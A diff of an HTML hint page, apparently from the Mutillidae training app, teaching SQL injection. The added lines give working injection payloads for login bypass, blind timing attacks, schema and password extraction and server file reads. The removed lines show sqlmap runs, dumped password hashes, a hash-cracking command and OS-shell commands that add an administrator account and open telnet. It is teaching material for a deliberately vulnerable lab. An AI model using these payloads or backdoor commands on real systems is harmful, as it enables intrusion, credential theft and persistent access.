@@ -21,11 +21,48 @@
 			<br/><br/>
 			<span class="report-header">Exploitation</span>
 			<br/><br/>
-			Determine the prefix and suffix needed to make the injected code "fit" syntatically
-			then add a payload between. Inject the exploit.
-			<br/><br/>
-			Example: Some pages on the site are vulnerable to 
-<br/>
+			<ol class="tutorial">
+				<li>
+					Determine if SQL injection exists
+					<br/><br/>
+					<ul>
+						<li>
+							Try injecting characters reserved in databases to produce error messages
+							<br/><br/>
+							<span class="important-code">single-quote<br/>back-slash<br/>double-hyphen<br/>forward-slash<br/>period</span>
+							<br/><br/> 
+						</li>
+						<li>If error message is produces, examine message for helpful errors, queries, database brand, columns, tables or other information.</li>
+						<li>
+							If no error message present, send valid data, "true" injections ("or 1=1") and "false" injections ("and 1=0"). Look for difference in the three responses
+							<br/><br/>
+							<span class="important-code">
+								Technique: Blind SQL Injection - True and False Values<br/>
+								Field: username<br/>
+								True Value (Using Proxy): &#39; or 1=1 --<br/> 
+								False Value (Using Proxy): &#39; and 1=0 --<br/>
+							</span>
+							<br/> 
+						</li>
+						<li>
+							If no errors nor differences are produced, try timing attacks ("mysql sleep(), sql server waitfor(), oracle sleep()")
+							<br/><br/>
+							<span class="important-code">
+								&#39; union Select null, null, null, sleep(5) -- 
+							</span>
+							<br/><br/>
+						</li>
+					</ul>
+				</li>
+				<li>
+					Determine injection types that work<br/><br/>
+					
+					<ul>
+						<li>Determine the prefix and suffix needed to make the injected code "fit" syntatically
+							then add a payload between. Inject the exploit.
+							<br/><br/>
+							Example: Some pages on the site are vulnerable to
+							<br/>
 <code>
 ' or 1=1 -- (Note: There is a space on the end of this expression) 
 </code>
@@ -40,291 +77,275 @@
 <code>
 %27%20%6f%72%20%31%3d%31%20%2d%2d%20 
 </code>
-			<br/>
-			<span class="report-header">Running SQLMAP Help</span>
-			<br/><br/>	
-			Note: On backtrack, SQLMap is found in /pentest/database/sqlmap/
-			<br/><br/>
-			./sqlmap.py --help	Help<br/>
-			./sqlmap.py -hh		Double the help
-			<br/><br/>
-			<span class="report-header">
-				Running SQLMAP &quot;Manually&quot;
-			</span>
-			<br/><br/>
-			./sqlmap.py --url=&quot;http://192.168.56.102/mutillidae/index.php?page=login.php&quot; --data=&quot;username=asdf&amp;password=asdf&amp;login-php-submit-button=Login&quot; --banner
-			<br/><br/>
-			<span class="report-header">
-				Capturing Request To Pass To SQLMAP
-			</span>
-			<br/><br/>
-			Note: Save request to a file such as ~/engagements/sqlmap/login.php.request. The -r switch takes the file path.
-			<br/><br/>
-			URL: http://192.168.56.102/mutillidae/index.php?page=login.php
-			<br/><br/>
-			Request:
-			<br/>
-			<span style="white-space: pre;">
-POST /mutillidae/index.php?page=login.php HTTP/1.1
-Host: 192.168.56.102
-User-Agent: Mozilla/5.0 (X11; Linux i686 on x86_64; rv:17.0) Gecko/20100101 Firefox/17.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Proxy-Connection: keep-alive
-Referer: http://192.168.56.102/mutillidae/index.php?page=login.php
-Cookie: showhints=0; PHPSESSID=fik978dbhcujcgdjfc2lg249r4
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 57
-
-username=asdf&amp;password=asdf&amp;login-php-submit-button=Login
-</span>
-						<br/>
-						<span class="report-header">
-						Running SQLMAP with &quot;auto-parse&quot;
-						</span>
-						<br/><br/>
-							./sqlmap.py -r ~/engagements/sqlmap/login.php.request &lt;options&gt;
-						<br/><br/>
-						<span class="report-header">
-						Running SQLMAP with various features
-						</span>
-						<br/><br/>
-						./sqlmap.py -r ~/engagements/sqlmap/login.php.request &lt;options&gt;
-						<br/>
-<span style="white-space: pre;">
---banner
-
-	web server operating system: Windows
-	web application technology: PHP 5.4.4, Apache 2.4.2
-	back-end DBMS: MySQL 5.0
-	banner:    &#39;5.5.25a&#39;
-
---fingerprint
-
-	web server operating system: Windows
-	web application technology: PHP 5.4.4, Apache 2.4.2
-	back-end DBMS: active fingerprint: MySQL &gt;= 5.5.0
-
-    --current-user      Retrieve DBMS current user
-    --current-db        Retrieve DBMS current database
-    --hostname          Retrieve DBMS server hostname
-    --is-dba            Detect if the DBMS current user is DBA
-
-	current user:    &#39;root@localhost&#39;
-	current database:    &#39;nowasp&#39;
-	current user is DBA:    True
-	hostname:    &#39;mutillid-7se1xr&#39;
-
-    --users             Enumerate DBMS users
-    --passwords         Enumerate DBMS users password hashes
-
-	database management system users 
-	[*] &#39;&#39;@&#39;localhost&#39;
-	[*] &#39;pma&#39;@&#39;localhost&#39;
-	[*] &#39;root&#39;@&#39;linux&#39;
-	[*] &#39;root&#39;@&#39;localhost&#39;
-
-    --dbs               Enumerate DBMS databases
-
-	available databases[10]:
-	[*] cdcol
-	[*] information_schema
-	[*] mysql
-	[*] nowasp
-	[*] owasp10
-	[*] owasp13
-	[*] performance_schema
-	[*] phpmyadmin
-	[*] test
-	[*] webauth
-</span>
-<br/><br/>
-<span class="report-header">
-Enumerate DBMS database tables, columns, structure (schema)
-</span>
 <br/>
-<span style="white-space: pre;">
-    --tables            Enumerate DBMS database tables
-    --columns           Enumerate DBMS database table columns
-    --schema            Enumerate DBMS schema
-    --count             Retrieve number of entries for table(s)
-    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
-    -D DB               DBMS database to enumerate
-    -T TBL              DBMS database table to enumerate
-    -C COL              DBMS database table column to enumerate
-    -U USER             DBMS user to enumerate
-</span>
-<br/><br/>
-							<span class="report-header">
-								Extracting data
+					
+						</li>
+						<li>
+							UNION statements
+							<br/><br/>
+							<ul>
+								<li>Determine number of columns in application query. Inject NULL columns until injected query works.</li>
+								<li>Determine position of a varchar or equivalent column</li>
+								<li>Use position of found column(s) to place injected columns. Use NULL for rest</li>
+								<br/>
+							</ul>
+						</li>
+						<li>Inline injection
+							<br/><br/>
+							<ul>
+								<li>Usually happens when ORDER BY or HAVING clause present in application query</li>
+								<br/>
+							</ul>
+						</li>
+						<li>Timing injection
+							<br/><br/>
+							<span class="important-code">
+								Technique: Blind SQL Injection - Timing<br/>
+								Page: login.php<br/>
+								Field: username<br/>
+								Value (Using Proxy): &#39; union Select null, case SUBSTRING(current_user(),1,1) when &#39;r&#39; THEN sleep(5) ELSE sleep(0) END, null, null --<br/> 
+								Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&amp;password=&amp;login-php-submit-button=1
 							</span>
 							<br/><br/>
-<span style="white-space: pre;">
-    --dump              Dump DBMS database table entries
-    --dump-all          Dump all DBMS databases tables entries
-    -D DB               DBMS database to enumerate
-    -T TBL              DBMS database table to enumerate
-    -C COL              DBMS database table column to enumerate
-    -U USER             DBMS user to enumerate
-    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
-    --start=LIMITSTART  First query output entry to retrieve
-    --stop=LIMITSTOP    Last query output entry to retrieve
-    --sql-query=QUERY   SQL statement to be executed
-    --sql-shell         Prompt for an interactive SQL shell
-</span>
-							<br/><br/>
-							<span class="report-header">
-							Listing columns from tables
-							</span>
-							<br/><br/>
-<span style="white-space: pre;">
-	./sqlmap.py -r ~/engagements/sqlmap/login.php.request -D mysql -T user --columns
-	./sqlmap.py -r ~/engagements/sqlmap/login.php.request -D mysql -T user --common-columns
-	./sqlmap.py -r ~/engagements/sqlmap/login.php.request -D mysql 
-	--sql-query=&quot;select column_name from information_schema.columns where table_name = &#39;user&#39;&quot;
-
-	select column_name from information_schema.columns where table_name = &#39;user&#39; [42]:
-		[*] Alter_priv
-		[*] Alter_routine_priv
-		[*] authentication_string
-		[*] Create_priv
-		[*] Create_routine_priv
-		[*] Create_tablespace_priv
-		[*] Create_tmp_table_priv
-		[*] Create_user_priv
-		[*] Create_view_priv
-		[*] Delete_priv
-		[*] Drop_priv
-		[*] Event_priv
-		[*] Execute_priv
-		[*] File_priv
-		[*] Grant_priv
-		[*] Host
-		[*] Index_priv
-		[*] Insert_priv
-		[*] Lock_tables_priv
-		[*] max_connections
-		[*] max_questions
-		[*] max_updates
-		[*] max_user_connections
-		[*] Password
-		[*] plugin
-		[*] Process_priv
-		[*] References_priv
-		[*] Reload_priv
-		[*] Repl_client_priv
-		[*] Repl_slave_priv
-		[*] Select_priv
-		[*] Show_db_priv
-		[*] Show_view_priv
-		[*] Shutdown_priv
-		[*] ssl_cipher
-		[*] ssl_type
-		[*] Super_priv
-		[*] Trigger_priv
-		[*] Update_priv
-		[*] User
-		[*] x509_issuer
-		[*] x509_subject
-</span>
-								<br/><br/>
-								<span class="report-header">
-									Advanced: Modifying injections
-								</span>
-							<br/><br/>
-<span style="white-space: pre;">
-	SELECT * FROM accounts WHERE username=&#39;&#39; AND password=&#39;&#39;&#39;
-
-	./sqlmap.py -r ~/engagements/sqlmap/login.php.request --prefix=&quot;SELECT * FROM accounts WHERE username=&#39;&quot; --suffix=&quot;&#39;-- &quot; --banner
-
-    --prefix=PREFIX     Injection payload prefix string
-    --suffix=SUFFIX     Injection payload suffix string
-</span>
-<br/><br/>
-<span class="report-header">
-Advanced: Dealing with inconsistent results
-</span>
-<br/><br/>
-<span style="white-space: pre;">
-	select User, Password from mysql.user
-
-	versus
-
-	./sqlmap.py -r ~/engagements/sqlmap/login.php.request -D mysql --sql-query=&quot;select User, Password from mysql.user order by User desc&quot;
-
-	select User, Password from mysql.user order by User desc
-
-	select User, Password, Host, authentication_string from mysql.user order by User desc [9]:
-		[*] root, , localhost, 
-		[*] root, , linux, 
-		[*] pma, , localhost, 
-		[*] Simba, *F43B942A34347297C3B0455DAB190AFB9BBF13B5, localhost, 
-		[*] Rocky, *2BA8DF85753BE61F6C72A8784B11E68A41878032, localhost, 
-		[*] Patches, *2027D9391E714343187E07ACB41AE8925F30737E, localhost, 
-		[*] Happy, *160E7D8EE3A97BED0F0AD1563BFB619178D15D7B, localhost, 
-		[*] , , localhost, 
-		[*] , , linux, 
-</span>
+						</li>
+					</ul>
+				</li>
+				<li>
+					Attempt to determine database server brand
+					<br/><br/>
+					<span class="important-code">
+						Technique: Direct Injection<br/>
+						Page: user-info.php<br/>
+						Field: username<br/>
+						Value (Using Proxy): &#39; union select null,VERSION() AS username,null,null -- <br/> 
+					</span>
+					<br/>
+				</li>
+				<li>Formulate and test query</li>
+				<br/>
+				<li>Attempt to determine database name
+					<br/><br/>
+					<span class="important-code">
+						Technique: Direct Injection<br/>
+						Page: user-info.php<br/>
+						Field: username<br/>
+						Value (Using Proxy): &#39; union select null,DATABASE() AS username,null,null -- <br/> 
+					</span>
+					<br/>
+				</li>
+				<li>Attempt to determine schema name
+					<br/><br/>
+					<span class="important-code">
+						Technique: Direct Injection<br/>
+						Page: user-info.php<br/>
+						Field: username<br/>
+						Value (Using Proxy): &#39; union select null,table_schema AS username,null,null from INFORMATION_SCHEMA.TABLES-- <br/> 
+					</span>
+					<br/>
+				</li>
+				<li>
+					Attempt to determine table(s) names
+					<br/><br/>
+					<span class="important-code">
+						Technique: Direct Injection<br/>
+						Page: user-info.php<br/>
+						Field: username<br/>
+						Value (Using Proxy): &#39; union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- <br/> 
+					</span>
+					<br/>
+				</li>
+				<li>Attempt to determine column(s) names
+					<br/><br/>
+					<span class="important-code">
+						Technique: Direct Injection<br/>
+						Recon: Extract table columns from database using a single field<br/>
+						Page: user-info.php<br/>
+						Field: Username<br/>
+						Value: ' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS--<br/> 
+					</span>
+					<br/>
+				</li>
+				<li>
+					Attempt to extract data
+					<br/><br/>
+					<span class="important-code">
+						Technique: Direct Injection<br/>
+						Page: user-info.php<br/>
+						Field: Username<br/>
+						Value: ' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- <br/>
+					</span>
+					<br/>
+				</li>
+				<li>
+					Attempt to read files from server
+					<br/><br/>
+					<span class="important-code">
+						Technique: Direct Injection<br/>
+						Page: user-info.php<br/>
+						Field: username<br/>
+						Value (relative path):<br/>
+						' union select null, LOAD_FILE('../README') AS username, null, null--<br/><br/> 
+						Value (absolute path):<br/>
+						' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts') AS username, null, null--<br/> 
+						' union select null, LOAD_FILE('..\\..\\..\\..\\WINDOWS\\inf\\cpu.inf') AS username, null, null--<br/> 
+					</span>
+					<br/>
+				</li>
+				<li>Attempt to upload files to server</li>
+				<br/>			
+				<li>
+					Attempt to execute commands. This is easier on SQL Server 2000 and 2005. MySQL has limited
+					system command abilities. SQL Server 2008 disables system commands by default and requires
+					them to be enabled.
+				</li>
+				<br/>
+				<li>
+					Attempt to determine database computer name, IP address, username, version, etc.
+					<br/><br/>
+					<span class="important-code">
+						MySQL Functions:<br/>
+						VERSION() - MySQL server version<br/>
+						USER() - Database user issuing query<br/>
+						DATABASE() - Database on server against which query is running
 						<br/><br/>
-						<span class="report-header">
-						Cracking MySQL Password Hashes
-						</span>
-						<br/><br/>
-<span style="white-space: pre;">
-John the Ripper Command  Line
-
-/pentest/passwords/john/john --format=mysql-sha1 /tmp/mysql.hashes
-
-Password Hashes in MySQL Format
-
-Simba:*F43B942A34347297C3B0455DAB190AFB9BBF13B5
-Rocky:*2BA8DF85753BE61F6C72A8784B11E68A41878032
-Patches:*2027D9391E714343187E07ACB41AE8925F30737E
-Happy:*160E7D8EE3A97BED0F0AD1563BFB619178D15D7B
-</span>
-<br/><br/>
-<span class="report-header">
-Understanding sqlmap O/S Shell
-</span>
-<br/><br/>
-<span style="white-space: pre;">
-View transaction: tcpdump -i eth1 -vvv -X
-1st Stage Uploader
-2nd Stage Command Shell Page
-
-sc query state= all
-sc query tlntsvr
-sc config tlntsvr start= demand
-sc start tlntsvr
-net user root toor /add
-net localgroup TelnetClients /add
-net localgroup Administrators root /add
-net localgroup TelnetClients root /add
-netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scope=custom addresses=192.168.56.101
-</span>
+					</span>
+				</li>
+				<li>
+					Attempt to pivot to database server level. This will largely depend on either being able to execute
+					system commands via the database server or upload files to the file system. Uploading files would allow
+					web application pages to be uploaded which can contain system calls.
+				</li>
+			</ol>
+			<br/>
+			<span class="report-header">Reconnaissance</span>
 			<br/><br/>
-			<span class="report-header">
-				Interacting Directly with sqlmap O/S Shell Backdoor
-			</span>
+			Error messages can be excellent sources of information. 
+			Developers are often naive about error messages and allow their apps to display 
+			errors rather than log the errors privately or email them to support staff. Secure
+			sites use custom error pages that display no error messages. 
+			Finding an error message with respect to SQLi typically involves malforming the
+			query on purpose. Special characters can get the job done. Single-quotes and 
+			parenthesis often cause errors in SQL Server, Oracle and MySQL databases. Dont
+			forget to use different encodings of each character to see if that makes a difference.
+			For example, try URL encoding, hex, etc. Try those
+			first, then move onto any character that is not alpha-numeric. 
 			<br/><br/>
-			http://192.168.56.102/&lt;temp file name&gt;?cmd=ping%20192.168.56.101
+			Hint: Go to the documentation for ANSI-SQL, Oracle, SQL Server, and MySQL to see which characters 
+			are reserved in those respective systems. (ANSI-SQL is the "common" SQL shared by all compliant databases.) 
+			In particular, determine what are the comment symbols for the respective systems.
 			<br/><br/>
-			<span class="report-header">
-			Direct connection to the database
-			</span>
+			Try to find out what type of database is behind the application. Knowing
+			if the database is Oracle, SQL Server, or MySQL can help a lot. Each has its own meta-tables,
+			functions, system tables, system procedures, and vulnerabilities. If the database is SQL Server 
+			or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures. 
+			They both implement this SQL-92 standard structure. Oracle uses non-standard 
+			"Oracle Data Dictionary" views.	As of the date of this document, there is an awesome listing
+			at <a href="http://ss64.com/orad/">http://ss64.com/orad/</a>. 
 			<br/><br/>
-<span style="white-space: pre;">
-	Installing Py-MySQL Dependency
-
-		git clone https://github.com/petehunt/PyMySQL/
-		cd PyMySQL
-		python setup.py install
-		cd ..
-		rm -rf PyMySQL
-
-	./sqlmap.py -d mysql://root:&quot;&quot;@192.168.56.102:5123/OWASP10
-</span>
+			Sometimes the type of database can be infered by its behavior. For example, 
+			SQL Server and MySQL both use "--" (double-hyphen) as the comment symbols; however,
+			MySQL requires a space betwwen the comment symbol and the next character.
+			<br /><br />
+			This statement is a valid SQL injection against either SQL Server or MySQL:
+			<br/>
+<code>
+' union select/**/name/**/FROM/**/INFORMATION_SCHEMA.TABLES-- 
+</code>
+			<br />
+			MySQL can be identified by whether the injection requires a space on the end. Oracle
+			and SQL Server do not care if there is a space at the end of the injection or not. But
+			MySQL needs the space on the end. (At least when used with PHP.)
+			<br />
+<code>
+' union select name FROM INFORMATION_SCHEMA.TABLES-- (&lt;-- space required here) 
+</code>
+			<br/>
+			Determine the page capibilities. If the page displays database records, standard SQL
+			injection is probably the better tool. If the page processes queries but does not display query output
+			(i.e. - a login page), then blind SQLi may be the better tool.
+			<br/><br/>
+			Use the page normally and observe the behavior. For example, log into Mutillidae. Does Mutillidae
+			display any information from the database because you log-in? (No)
+			What happens when using page user-info.php?
+			Does any data displaywhen using page user-info.php? (Yes)
+			The login page is likely going to be a better candidate for blind SQL injection while user-info.php
+			is likely a better candidate for direct SQL injection. 
+			<br/><br/>
+			<span class="report-header">Scanning</span>
+			<br /><br />
+			Get specifications on database software (Example Page: user-info.php)
+			<br />
+<code>
+' union select null, database(), current_user(), version() -- 
+</code>
+			<br/>
+			If the meta-tables are available, they can footprint the database structure making 
+			the next steps much more productive.
+			<br/><br/>
+			Check the documentation for Oracle, MySQL, and SQL Server. Determine the meta-table structures, 
+			table/view names, and column names.  If the database is SQL Server 
+			or MySQL, investigate the INFORMATION_SCHEMA and understand the built-in functions/procedures. 
+			They both implement this SQL-92 standard structure. Oracle uses non-standard 
+			"Oracle Data Dictionary" views.	As of the date of this document, there is an awesome listing
+			at <a href="http://ss64.com/orad/">http://ss64.com/orad/</a>.
+			<br/><br/>
+			Extract table names from database. (Example Page: user-info.php)
+			<br />
+<code>
+' union select null,table_schema AS username,table_name AS password,null from INFORMATION_SCHEMA.TABLES-- 
+</code>
+		<br/>
+		Extract table columns from database using a single field (Example Page: user-info.php)
+		<br />
+<code>
+' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS-- 
+</code>
+		<br/>
+		Extract views from database (Example Page: user-info.php)
+		<br />
+<code>
+' union select null,concat_ws('.', COALESCE(table_schema,''), COALESCE(table_name,''), COALESCE(view_definition,'')) AS username,null,null from INFORMATION_SCHEMA.VIEWS-- 
+</code>
+		<br/>
+		Extract triggers from database (Example Page: user-info.php)
+		<br />
+<code>
+' union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
+</code>
+		<br/>
+		Extract routines/procs from database (Example Page: user-info.php)
+		<br />
+<code>
+' union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES-- 
+</code>
+		<br/>
+		Extract table columns from database (Example Page: user-info.php)
+		<br />
+<code>
+' union select null,concat_ws('.', table_schema, table_name, column_name) AS username,null,null from INFORMATION_SCHEMA.COLUMNS union select null,concat_ws('.', routine_schema, routine_name, routine_type, routine_body) AS username,null,null from INFORMATION_SCHEMA.ROUTINES union select null,concat_ws('.', table_schema, table_name, view_definition) AS username,null,null from INFORMATION_SCHEMA.VIEWS union select null,concat_ws('.', trigger_schema, trigger_name) AS username,null,null from INFORMATION_SCHEMA.TRIGGERS-- 
+</code>
+		<br/>
+		Blind SQL injection does not depend on seeing any resulting records. Instead, page timing can be used.
+		<br/><br/>
+		Blind SQL Injection/Brute Forcing values (Example Page: login.php)
+		<br />
+<code>
+' union Select null, case current_user() when 'root@localhost' THEN sleep(5) ELSE sleep(0) END, null, null -- 
+</code>
+		<br/>
+		<span class="report-header">Gaining Access</span>
+		<br/><br/>
+		Extract passwords from user table (Example Page: user-info.php)
+		<br />
+<code>
+' union select null, owasp10.accounts.username AS username, owasp10.accounts.password AS password, null from owasp10.accounts -- 
+</code>
+		<br/>
+		Using SQL Injection (Page: login.php)
+		<br />
+<code>
+' or 1=1 -- 
+</code>
 			<br/>
 			<span class="report-header">
 			Using advanced techniques: Open files on target operating system
@@ -332,7 +353,7 @@ netsh firewall add portopening protocol=TCP port=23 name=telnet mode=enable scop
 			<br/><br/>
 			Page: user-info.php<br/>
 			Field: username<br/>
-			Values:<br/>
+	Values:<br/>
 <code>
 	&#39; union select null, LOAD_FILE(&#39;../README&#39;) AS username, null, null-- 
 	&#39; union select null, LOAD_FILE(&#39;..\\..\\..\\..\\WINDOWS\\system32\\drivers\\etc\\hosts&#39;) AS username, null, null-- 
